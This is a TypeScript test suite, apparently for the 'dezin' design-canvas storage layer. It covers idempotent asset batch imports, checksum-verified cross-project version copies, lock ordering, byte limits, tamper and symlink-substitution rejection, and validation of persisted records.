              assert.equal(
                durablePhases.at(-1),
                completed,
                `${completed} may not be observable until its files and directory entries are durable`,
              );
              if (completed === phase) throw new Error(`simulated Asset receipt exit after ${phase}`);
            },
          }]),
          new RegExp(`exit after ${phase}`),
        );

        const recovered = await ensureDesignCanvasAssetBatch(dataDir, projectId, input, 200);
        assert.equal(recovered.reused, phase === "canvas" || phase === "receipt");
        assert.equal(recovered.canvas.revision, 1);
        assert.deepEqual(recovered.canvas.nodeOrder, [`node-${phase}`]);
        assert.equal((await listDesignVersions(dataDir, projectId, `node-${phase}`)).length, 1);

        await mutateDesignCanvas(dataDir, projectId, {
          expectedRevision: 1,
          intents: [{ type: "set-viewport", viewport: { x: 20, y: 30, zoom: 1.2 } }],
        }, 300);
        const replayed = await ensureDesignCanvasAssetBatch(dataDir, projectId, input, 400);
        assert.equal(replayed.reused, true);
        assert.deepEqual(replayed.canvas, recovered.canvas);
        assert.equal((await listDesignVersions(dataDir, projectId, `node-${phase}`)).length, 1);
        await assert.rejects(ensureDesignCanvasAssetBatch(dataDir, projectId, {
          ...input,
          requestHash: "f".repeat(64),
        }), /idempotencyKey.*different.*request/i);
        await assert.rejects(ensureDesignCanvasAssetBatch(dataDir, projectId, {
          ...input,
          items: [{
            ...input.items[0]!,
            asset: { ...input.items[0]!.asset, name: `changed-${phase}.png` },
          }],
        }), /idempotencyKey.*different.*request/i);
      } finally {
        await rm(dataDir, { recursive: true, force: true });
      }
    });
  }
});

test("a material import publishes v1 and resolves its immutable Asset preview", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-material-v1-"));
  const projectId = "project-material-v1";
  const bytes = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from("material v1"),
  ]);
  try {
    await initializeDesignProject(dataDir, projectId);
    const canvas = await importDesignCanvasAssetBatch(dataDir, projectId, {
      expectedRevision: 0,
      items: [{
        asset: { name: "material.png", mimeType: "image/png", base64: bytes.toString("base64") },
        binding: { type: "create-node", node: { id: "node-material", kind: "image" } },
      }],
    }, 100);

    const node = canvas.nodes[0]!;
    assert.equal(node.versionCount, 1);
    assert.equal(node.currentVersionId, node.selectedVersionId);
    assert.ok(node.currentVersionId);
    const versions = await listDesignVersions(dataDir, projectId, node.id);
    assert.equal(versions.length, 1);
    assert.equal(versions[0]?.contentKind, "asset");
    assert.equal(versions[0]?.assetId, node.assetId);
    const preview = await resolveDesignVersionPreview(
      dataDir,
      projectId,
      node.id,
      node.currentVersionId!,
    );
    assert.equal(preview.kind, "asset");
    if (preview.kind === "asset") {
      assert.equal(preview.assetManifest.id, node.assetId);
      assert.deepEqual(await readFile(preview.path), bytes);
    }
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("Asset batch byte limits include every bundled byte copied from a cross-project Version", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-asset-batch-bundle-budget-"));
  const sourceProjectId = "project-bundle-budget-source";
  const targetProjectId = "project-bundle-budget-target";
  try {
    await initializeDesignProject(dataDir, sourceProjectId);
    await initializeDesignProject(dataDir, targetProjectId);
    await mutateDesignCanvas(dataDir, sourceProjectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-source", kind: "page" } }],
    });
    const largePng = Buffer.alloc(1024 * 1024);
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(largePng);
    const refs = join(dataDir, "projects", sourceProjectId, ".refs");
    await mkdir(refs, { recursive: true });
    await Promise.all([
      writeFile(join(refs, "first-large.png"), largePng),
      writeFile(join(refs, "second-large.png"), largePng),
    ]);
    const first = await storeDesignAsset(dataDir, sourceProjectId, {
      name: "first-large.png",
      mimeType: "image/png",
      uploadedFileId: ".refs/first-large.png",
    });
    const second = await storeDesignAsset(dataDir, sourceProjectId, {
      name: "second-large.png",
      mimeType: "image/png",
      uploadedFileId: ".refs/second-large.png",
    });
    const version = await publishDesignVersion(dataDir, sourceProjectId, {
      nodeId: "node-source",
      html: `<!doctype html><html><head></head><body><img src="dezin-asset://${first.id}"><img src="dezin-asset://${second.id}"></body></html>`,
      contextHash: "b".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });

    await assert.rejects(importDesignCanvasAssetBatch(dataDir, targetProjectId, {
      expectedRevision: 0,
      items: [{
        asset: {
          name: "Oversized copied Version",
          sourceVersion: {
            projectId: sourceProjectId,
            nodeId: "node-source",
            versionId: version.manifest.id,
          },
        },
        binding: { type: "create-node", node: { id: "node-import", kind: "document" } },
      }],
    }, undefined, {
      assetBatchByteLimit: Math.floor(1.5 * 1024 * 1024),
    }), /batch exceeds its bounded size/i);

    const target = await getDesignCanvas(dataDir, targetProjectId);
    assert.equal(target.revision, 0);
    assert.deepEqual(target.nodes, []);
    assert.deepEqual(await listDesignAssets(dataDir, targetProjectId), []);
    await assert.rejects(
      readdir(join(dataDir, "projects", targetProjectId, "design", "assets", ".transactions")),
      /ENOENT/,
    );
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("reciprocal cross-project sourceVersion imports acquire Project locks without deadlocking", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-source-version-reciprocal-locks-"));
  const projectA = "project-source-lock-a";
  const projectB = "project-source-lock-b";
  try {
    const [versionA, versionB] = await Promise.all([
      sourceVersionFixture(dataDir, projectA),
      sourceVersionFixture(dataDir, projectB),
    ]);

    const [assetFromB, assetFromA] = await completesBefore(Promise.all([
      storeDesignAsset(dataDir, projectA, {
        name: "Imported from B",
        sourceVersion: {
          projectId: projectB,
          nodeId: "node-source",
          versionId: versionB.manifest.id,
        },
      }),
      storeDesignAsset(dataDir, projectB, {
        name: "Imported from A",
        sourceVersion: {
          projectId: projectA,
          nodeId: "node-source",
          versionId: versionA.manifest.id,
        },
      }),
    ]));

    assert.equal(assetFromB.sourceVersion?.projectId, projectB);
    assert.equal(assetFromA.sourceVersion?.projectId, projectA);
  } finally {
    await rm(dataDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 10 });
  }
});

test("a multi-source Version batch and an inverse import share one deterministic Project lock order", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-source-version-batch-locks-"));
  const projectA = "project-batch-lock-a";
  const projectB = "project-batch-lock-b";
  const projectC = "project-batch-lock-c";
  try {
    const [versionA, versionB, versionC] = await Promise.all([
      sourceVersionFixture(dataDir, projectA),
      sourceVersionFixture(dataDir, projectB),
      sourceVersionFixture(dataDir, projectC),
    ]);

    const [batch, inverse] = await completesBefore(Promise.all([
      importDesignCanvasAssetBatch(dataDir, projectA, {
        expectedRevision: 2,
        items: [
          {
            asset: {
              name: "Imported B",
              sourceVersion: {
                projectId: projectB,
                nodeId: "node-source",
                versionId: versionB.manifest.id,
              },
            },
            binding: { type: "create-node", node: { id: "node-from-b", kind: "document" } },
          },
          {
            asset: {
              name: "Imported C",
              sourceVersion: {
                projectId: projectC,
                nodeId: "node-source",
                versionId: versionC.manifest.id,
              },
            },
            binding: { type: "create-node", node: { id: "node-from-c", kind: "document" } },
          },
        ],
      }),
      storeDesignAsset(dataDir, projectB, {
        name: "Inverse import from A",
        sourceVersion: {
          projectId: projectA,
          nodeId: "node-source",
          versionId: versionA.manifest.id,
        },
      }),
    ]));

    assert.deepEqual(batch.nodes.slice(-2).map((node) => node.id), ["node-from-b", "node-from-c"]);
    assert.equal(inverse.sourceVersion?.projectId, projectA);
  } finally {
    await rm(dataDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 10 });
  }
});

test("a same-Project sourceVersion snapshot copies pinned Asset bytes without re-entering its Project lock", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-source-version-same-project-lock-"));
  const projectId = "project-source-lock-same";
  try {
    await initializeDesignProject(dataDir, projectId);
    const image = await storeDesignAsset(dataDir, projectId, {
      name: "same-project.png",
      mimeType: "image/png",
      base64: Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from("same-project-pixel"),
      ]).toString("base64"),
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-source", kind: "component" } }],
    });
    const version = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-source",
      html: `<!doctype html><html><head></head><body><img src="dezin-asset://${image.id}"></body></html>`,
      contextHash: "7".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });

    const copied = await completesBefore(storeDesignAsset(dataDir, projectId, {
      name: "Same Project snapshot",
      sourceVersion: { projectId, nodeId: "node-source", versionId: version.manifest.id },
    }));
    assert.equal(copied.sourceVersion?.projectId, projectId);
    assert.deepEqual(copied.sourceVersion?.assetPins.map((pin) => pin.assetId), [image.id]);
    assert.ok(copied.bundleFiles.some((file) => file.checksum === image.checksum));
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("an idempotent sourceVersion batch replays its receipt after the source Project is removed", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-source-version-receipt-replay-"));
  const sourceProjectId = "project-source-receipt";
  const targetProjectId = "project-target-receipt";
  try {
    const version = await sourceVersionFixture(dataDir, sourceProjectId);
    await initializeDesignProject(dataDir, targetProjectId);
    const input = {
      idempotencyKey: "source-version-receipt-replay",
      requestHash: "8".repeat(64),
      items: [{
        asset: {
          name: "Durable source snapshot",
          sourceVersion: {
            projectId: sourceProjectId,
            nodeId: "node-source",
            versionId: version.manifest.id,
          },
        },
        binding: { type: "create-node" as const, node: { id: "node-import", kind: "document" as const } },
      }],
    };
    const first = await ensureDesignCanvasAssetBatch(dataDir, targetProjectId, input);
    assert.equal(first.reused, false);
    await rm(join(dataDir, "projects", sourceProjectId, "design"), { recursive: true, force: true });

    const replay = await ensureDesignCanvasAssetBatch(dataDir, targetProjectId, input);
    assert.equal(replay.reused, true);
    assert.deepEqual(replay.canvas, first.canvas);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("sourceVersion batch projection rejects a pinned payload before reading beyond its byte budget", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-source-version-pre-read-budget-"));
  const sourceProjectId = "project-source-pre-read-budget";
  const targetProjectId = "project-target-pre-read-budget";
  try {
    await initializeDesignProject(dataDir, sourceProjectId);
    await initializeDesignProject(dataDir, targetProjectId);
    const image = await storeDesignAsset(dataDir, sourceProjectId, {
      name: "budget.png",
      mimeType: "image/png",
      base64: Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from("budget-payload"),
      ]).toString("base64"),
    });
    await mutateDesignCanvas(dataDir, sourceProjectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-source", kind: "component" } }],
    });
    const version = await publishDesignVersion(dataDir, sourceProjectId, {
      nodeId: "node-source",
      html: `<!doctype html><html><head></head><body><img src="dezin-asset://${image.id}"></body></html>`,
      contextHash: "9".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const payload = await resolveDesignAssetFile(
      dataDir,
      sourceProjectId,
      image.id,
      image.fileName,
    );
    await rm(payload.path, { force: true });

    await assert.rejects(importDesignCanvasAssetBatch(dataDir, targetProjectId, {
      expectedRevision: 0,
      items: [{
        asset: {
          name: "Budgeted snapshot",
          sourceVersion: {
            projectId: sourceProjectId,
            nodeId: "node-source",
            versionId: version.manifest.id,
          },
        },
        binding: { type: "create-node", node: { id: "node-import", kind: "document" } },
      }],
    }, undefined, {
      assetBatchByteLimit: version.manifest.bytes + image.bytes - 1,
    }), /batch exceeds its bounded size/i);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("sourceVersion snapshots reject same-byte path substitution before reading a pinned payload", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-source-version-toctou-"));
  const sourceProjectId = "project-source-version-toctou";
  const targetProjectId = "project-target-version-toctou";
  try {
    await initializeDesignProject(dataDir, sourceProjectId);
    await initializeDesignProject(dataDir, targetProjectId);
    const bytes = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.from("same-byte source snapshot"),
    ]);
    const image = await storeDesignAsset(dataDir, sourceProjectId, {
      name: "source.png",
      mimeType: "image/png",
      base64: bytes.toString("base64"),
    });
    await mutateDesignCanvas(dataDir, sourceProjectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-source", kind: "component" } }],
    });
    const version = await publishDesignVersion(dataDir, sourceProjectId, {
      nodeId: "node-source",
      html: `<!doctype html><html><head></head><body><img alt="" src="dezin-asset://${image.id}"></body></html>`,
      contextHash: "f".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const payload = await resolveDesignAssetFile(
      dataDir,
      sourceProjectId,
      image.id,
      image.fileName,
    );
    const replacement = join(dataDir, "same-source.png");
    await writeFile(replacement, bytes);
    let substituted = false;

    await assert.rejects(importDesignCanvasAssetBatch(dataDir, targetProjectId, {
      expectedRevision: 0,
      items: [{
        asset: {
          name: "Source snapshot",
          sourceVersion: {
            projectId: sourceProjectId,
            nodeId: "node-source",
            versionId: version.manifest.id,
          },
        },
        binding: { type: "create-node", node: { id: "node-import", kind: "document" } },
      }],
    }, undefined, {
      beforeSourceVersionPayloadOpen: async (input: { kind: string; path: string }) => {
        if (input.kind !== "asset" || substituted) return;
        substituted = true;
        await rm(input.path, { force: true });
        await symlink(replacement, input.path);
      },
    }), /unsafe|unavailable|changed|invalid/i);
    assert.equal(substituted, true);
    const target = await getDesignCanvas(dataDir, targetProjectId);
    assert.equal(target.revision, 0);
    assert.deepEqual(target.nodes, []);
    assert.deepEqual(target.nodeOrder, []);
    assert.deepEqual(await listDesignAssets(dataDir, targetProjectId), []);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("an exact cross-project Design Version is checksum-verified and byte-copied as an HTML Asset", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-source-version-"));
  const sourceProjectId = "project-source";
  const targetProjectId = "project-target";
  try {
    await initializeDesignProject(dataDir, sourceProjectId);
    await initializeDesignProject(dataDir, targetProjectId);
    await mutateDesignCanvas(dataDir, sourceProjectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-source", kind: "page" } }],
    });
    const sourceImage = await storeDesignAsset(dataDir, sourceProjectId, {
      name: "source-context.png",
      mimeType: "image/png",
      base64: Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from("source pinned image"),
      ]).toString("base64"),
    });
    const sourceHtml = `<!doctype html><html><head></head><body>Exact source HTML<img src="dezin-asset://${sourceImage.id}"></body></html>`;
    const version = await publishDesignVersion(dataDir, sourceProjectId, {
      nodeId: "node-source",
      html: sourceHtml,
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const asset = await storeDesignAsset(dataDir, targetProjectId, {
      name: "Imported exact version",
      sourceVersion: {
        projectId: sourceProjectId,
        nodeId: "node-source",
        versionId: version.manifest.id,
      },
    });
    assert.equal(asset.mimeType, "text/html");
    assert.equal(asset.fileName, "original.html");
    assert.equal(asset.sourceVersion?.projectId, sourceProjectId);
    assert.equal(asset.sourceVersion?.nodeId, "node-source");
    assert.equal(asset.sourceVersion?.versionId, version.manifest.id);
    assert.equal(asset.sourceVersion?.checksum, version.manifest.checksum);
    assert.deepEqual(asset.sourceVersion?.assetPins.map((pin) => ({ assetId: pin.assetId, checksum: pin.checksum })), [{
      assetId: sourceImage.id,
      checksum: sourceImage.checksum,
    }]);
    assert.ok(asset.bundleFiles.some((file) => file.path.includes(sourceImage.id) && file.checksum === sourceImage.checksum));
    const copied = await resolveDesignAssetFile(dataDir, targetProjectId, asset.id, asset.fileName);
    const copiedHtml = await readFile(copied.path, "utf8");
    assert.match(copiedHtml, /Exact source HTML/);
    assert.match(copiedHtml, new RegExp(`bundle/assets/${sourceImage.id}/`));
    assert.doesNotMatch(copiedHtml, new RegExp(`/api/projects/${sourceProjectId}/`));

    const alternateSourceProjectId = "project-source-alternate";
    await initializeDesignProject(dataDir, alternateSourceProjectId);
    await mutateDesignCanvas(dataDir, alternateSourceProjectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-source", kind: "page" } }],
    });
    const alternateSourceImage = await storeDesignAsset(dataDir, alternateSourceProjectId, {
      name: "source-context.png",
      mimeType: "image/png",
      base64: Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from("source pinned image"),
      ]).toString("base64"),
    });
    assert.equal(alternateSourceImage.id, sourceImage.id);
    const alternateVersion = await publishDesignVersion(dataDir, alternateSourceProjectId, {
      nodeId: "node-source",
      html: sourceHtml,
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const alternateAsset = await storeDesignAsset(dataDir, targetProjectId, {
      name: "Imported exact version",
      sourceVersion: {
        projectId: alternateSourceProjectId,
        nodeId: "node-source",
        versionId: alternateVersion.manifest.id,
      },
    });
    assert.equal(alternateAsset.checksum, asset.checksum);
    assert.notEqual(alternateAsset.id, asset.id);

    await assert.rejects(storeDesignAsset(dataDir, targetProjectId, {
      name: "Missing source",
      sourceVersion: { projectId: sourceProjectId, nodeId: "node-foreign", versionId: version.manifest.id },
    }), /unavailable|missing/i);

    const sourceFile = await resolveDesignVersionFile(
      dataDir,
      sourceProjectId,
      "node-source",
      version.manifest.id,
      "index.html",
    );
    await writeFile(sourceFile.path, "<!doctype html><html><head></head><body>Tampered</body></html>");
    await assert.rejects(storeDesignAsset(dataDir, targetProjectId, {
      name: "Tampered source",
      sourceVersion: { projectId: sourceProjectId, nodeId: "node-source", versionId: version.manifest.id },
    }), /checksum|invalid/i);

    // Restore the immutable canonical bytes before proving the target bundle no longer depends on the source Project.
    const canonicalSource = sourceHtml.replace(
      `dezin-asset://${sourceImage.id}`,
      `/api/projects/${sourceProjectId}/design-canvas/assets/${sourceImage.id}/${sourceImage.fileName}?nodeId=node-source&versionId=${version.manifest.id}&checksum=${sourceImage.checksum}`,
    ).replaceAll("&", "&amp;");
    await writeFile(sourceFile.path, canonicalSource);
    await importDesignCanvasAssetBatch(dataDir, targetProjectId, {
      expectedRevision: 0,
      items: [{
        asset: {
          name: "Imported exact version",
          sourceVersion: { projectId: sourceProjectId, nodeId: "node-source", versionId: version.manifest.id },
        },
        binding: { type: "create-node", node: { id: "node-import", kind: "document" } },
      }],
    });
    await rm(join(dataDir, "projects", sourceProjectId, "design"), { recursive: true, force: true });
    const created = await createDesignJob(dataDir, targetProjectId, {
      kind: "node-analysis",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-import",
    });
    const context = await getDesignJobContext(dataDir, targetProjectId, created.job.id);
    const stagingDir = join(dataDir, "materialized-import");
    await mkdir(stagingDir, { recursive: true });
    await materializeDesignContext({
      dataDir,
      projectId: targetProjectId,
      targetNodeId: "node-import",
      job: created.job,
      context,
      stagingDir,
      priorityNodeIds: ["node-import"],
    });
    const materialized = JSON.parse(await readFile(join(stagingDir, ".context", "canvas.json"), "utf8"));
    const importedNode = materialized.nodes.find((node: { id: string }) => node.id === "node-import");
    assert.match(await readFile(join(stagingDir, importedNode.assetPath), "utf8"), /Exact source HTML/);
    const bundledImage = importedNode.assetBundleFiles.find((file: { checksum: string }) => file.checksum === sourceImage.checksum);
    assert.ok(bundledImage);
    assert.deepEqual(
      [...(await readFile(join(stagingDir, bundledImage.path))).subarray(0, 8)],
      [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a],
    );
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("persisted Design Version, Thread, and Job records reject unbounded or unexpected fields", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-record-validation-"));
  const projectId = "project-record-validation";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const version = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>Valid</body></html>",
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const versionPath = join(dataDir, "projects", projectId, "design", "nodes", "node-page", "versions", version.manifest.id, "manifest.json");
    const validVersion = JSON.parse(await readFile(versionPath, "utf8"));
    await writeFile(versionPath, `${JSON.stringify({ ...validVersion, legacyProposalId: "proposal-old" })}\n`);
    await assert.rejects(getDesignVersion(dataDir, projectId, "node-page", version.manifest.id), /invalid|unexpected|corrupt/i);
    await writeFile(versionPath, `${JSON.stringify({ ...validVersion, assetPins: [{ assetId: "asset-bad", checksum: "bad" }] })}\n`);
    await assert.rejects(getDesignVersion(dataDir, projectId, "node-page", version.manifest.id), /invalid|corrupt/i);
    await writeFile(versionPath, `${JSON.stringify(validVersion)}\n`);

    const thread = await getDesignThread(dataDir, projectId, { type: "node", nodeId: "node-page" });
    const threadPath = join(dataDir, "projects", projectId, "design", "nodes", "node-page", "agent", "thread.json");
    await writeFile(threadPath, `${JSON.stringify({ ...thread, messages: [{
      id: "message-bad",
      role: "owner",
      content: "x".repeat(256 * 1024 + 1),
      jobId: null,
      createdAt: 1,
      legacy: true,
    }] })}\n`);
    await assert.rejects(getDesignThread(dataDir, projectId, { type: "node", nodeId: "node-page" }), /invalid|unexpected|corrupt/i);

    const created = await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      runnerId: "fixture",
      model: "fixture-model",
      nodeId: "node-page",
    });
    await assert.rejects(
      appendDesignJobActivity(
        dataDir,
        projectId,
        created.job.id,
        { kind: "tool", text: "Missing identity" } as unknown as Parameters<typeof appendDesignJobActivity>[3],
      ),
      /invalid/i,
    );
    const appended = await appendDesignJobActivity(dataDir, projectId, created.job.id, {
      kind: "tool",
      text: "Writing index.html",
      toolName: "write",
      toolCallId: "tool-write-1",
      toolInput: "{\"file_path\":\"index.html\"}",
      diff: "--- /dev/null\n+++ b/index.html\n@@ -0,0 +1,1 @@\n+<main />",
    });
    assert.equal(appended.activity.at(-1)?.toolName, "write");
    const withResult = await updateDesignJobToolActivity(dataDir, projectId, created.job.id, {
      toolCallId: "tool-write-1",
      toolResult: "File written",
      toolResultError: false,
    });
    assert.equal(withResult.activity.at(-1)?.toolResult, "File written");
    const jobPath = join(dataDir, "projects", projectId, "design", "jobs", `${created.job.id}.json`);
    const { runnerId: _runnerId, ...missingRunnerId } = created.job;
    await writeFile(jobPath, `${JSON.stringify(missingRunnerId)}\n`);
    await assert.rejects(getDesignJob(dataDir, projectId, created.job.id), /invalid|corrupt/i);
    const { model: _model, ...missingModel } = created.job;
    await writeFile(jobPath, `${JSON.stringify(missingModel)}\n`);
    await assert.rejects(getDesignJob(dataDir, projectId, created.job.id), /invalid|corrupt/i);
    const legacyToolActivity = {
      ...created.job,
      activity: [{ id: "activity-legacy", kind: "tool", text: "Legacy tool step", createdAt: created.job.createdAt }],
    };
    await writeFile(jobPath, `${JSON.stringify(legacyToolActivity)}\n`);
    assert.equal((await getDesignJob(dataDir, projectId, created.job.id)).activity[0]?.toolName, undefined);
    await writeFile(jobPath, `${JSON.stringify({
      ...created.job,
      activity: [{
        id: "activity-bad-tool-name",
        kind: "tool",
        text: "Unknown category",
        toolName: "shell",
        createdAt: created.job.createdAt,
      }],
    })}\n`);
    await assert.rejects(getDesignJob(dataDir, projectId, created.job.id), /invalid|corrupt/i);
    await writeFile(jobPath, `${JSON.stringify({
      ...created.job,
      activity: [{
        id: "activity-oversized-tool-input",
        kind: "tool",
        text: "Oversized input",
        toolName: "write",
        toolInput: "x".repeat(64 * 1024 + 1),
        createdAt: created.job.createdAt,
      }],
    })}\n`);
    await assert.rejects(getDesignJob(dataDir, projectId, created.job.id), /invalid|corrupt/i);
    await writeFile(jobPath, `${JSON.stringify({
      ...created.job,
      status: "ready",
      finishedAt: null,
      activity: [{ id: "activity-bad", kind: "shell", text: "x", createdAt: 1, legacy: true }],
    })}\n`);
    await assert.rejects(getDesignJob(dataDir, projectId, created.job.id), /invalid|corrupt/i);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("document Nodes accept common Office MIME types and identical bytes cannot acquire a second MIME", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-office-assets-"));
  const projectId = "project-office";
  try {
    await initializeDesignProject(dataDir, projectId);
    const docxBytes = Buffer.from("opaque docx");
    const pptxBytes = Buffer.from("opaque pptx");
    const docxMime = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
    const pptxMime = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
    await storeDesignAsset(dataDir, projectId, {
      name: "brief.docx",
      mimeType: docxMime,
      base64: docxBytes.toString("base64"),
    });
    await storeDesignAsset(dataDir, projectId, {
      name: "deck.pptx",
      mimeType: pptxMime,
      base64: pptxBytes.toString("base64"),
    });
    const added = await importDesignCanvasAssetBatch(dataDir, projectId, {
      expectedRevision: 0,
      items: [
        {
          asset: { name: "brief.docx", mimeType: docxMime, base64: docxBytes.toString("base64") },
          binding: { type: "create-node", node: { id: "node-docx", kind: "document" } },
        },
        {
          asset: { name: "deck.pptx", mimeType: pptxMime, base64: pptxBytes.toString("base64") },
          binding: { type: "create-node", node: { id: "node-pptx", kind: "document" } },
        },
      ],
    });
    assert.deepEqual(added.nodes.map((node) => node.state), ["ready", "ready"]);

    const pngBytes = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.from("same bytes"),
    ]);
    const opaque = await storeDesignAsset(dataDir, projectId, {
      name: "opaque.bin",
      mimeType: "application/octet-stream",
      base64: pngBytes.toString("base64"),
    });
    const png = await storeDesignAsset(dataDir, projectId, {
      name: "later.png",
      mimeType: "image/png",
      base64: pngBytes.toString("base64"),
    });
    assert.notEqual(png.id, opaque.id);
    assert.equal(opaque.mimeType, "application/octet-stream");
    assert.equal(png.mimeType, "image/png");

    const renamed = await storeDesignAsset(dataDir, projectId, {
      name: "renamed.png",
      mimeType: "image/png",
      base64: pngBytes.toString("base64"),
    });
    assert.notEqual(renamed.id, png.id);
    assert.equal(renamed.checksum, png.checksum);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("Main Agent sessions park the active thread and swap transcripts", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-sessions-"));
  const projectId = "project-main-sessions";
  const mainMessages = async () => (await getDesignThread(dataDir, projectId, { type: "main" })).messages.map((message) => message.content);
  try {
    await initializeDesignProject(dataDir, projectId);
    const initial = await listDesignMainSessions(dataDir, projectId);
    assert.equal(initial.sessions.length, 1);
    assert.equal(initial.activeId, initial.sessions[0]!.id);
    // An empty active session already is the fresh one.
    assert.equal((await createDesignMainSession(dataDir, projectId)).sessions.length, 1);

    await appendDesignThreadMessage(dataDir, projectId, { type: "main" }, { role: "user", content: "First brief" }, 100);
    const created = await createDesignMainSession(dataDir, projectId, 200);
    assert.equal(created.sessions.length, 2);
    assert.notEqual(created.activeId, initial.activeId);
    assert.deepEqual(await mainMessages(), []);
    assert.equal(created.sessions.find((session) => session.id === initial.activeId)?.turns, 1);

    await appendDesignThreadMessage(dataDir, projectId, { type: "main" }, { role: "user", content: "Second brief" }, 300);
    const renamed = await renameDesignMainSession(dataDir, projectId, created.activeId, "Landing page");
    assert.equal(renamed.sessions.find((session) => session.id === created.activeId)?.title, "Landing page");

    const switched = await activateDesignMainSession(dataDir, projectId, initial.activeId, 400);
    assert.equal(switched.activeId, initial.activeId);
    assert.deepEqual(await mainMessages(), ["First brief"]);

    // Deleting the active session falls back to the most recent remaining one.
    const deleted = await deleteDesignMainSession(dataDir, projectId, initial.activeId, 500);
    assert.equal(deleted.activeId, created.activeId);
    assert.equal(deleted.sessions.length, 1);
    assert.deepEqual(await mainMessages(), ["Second brief"]);

    // A live Main Agent Job pins the transcript it is writing into.
    await createDesignJob(dataDir, projectId, {
      kind: "main-agent",
      ...FIXTURE_JOB_IDENTITY,
      reserveMainThreadTurn: { userContent: "Go", assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE },
    }, 600);
    await assert.rejects(createDesignMainSession(dataDir, projectId, 700), /running Main Agent turn/);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});
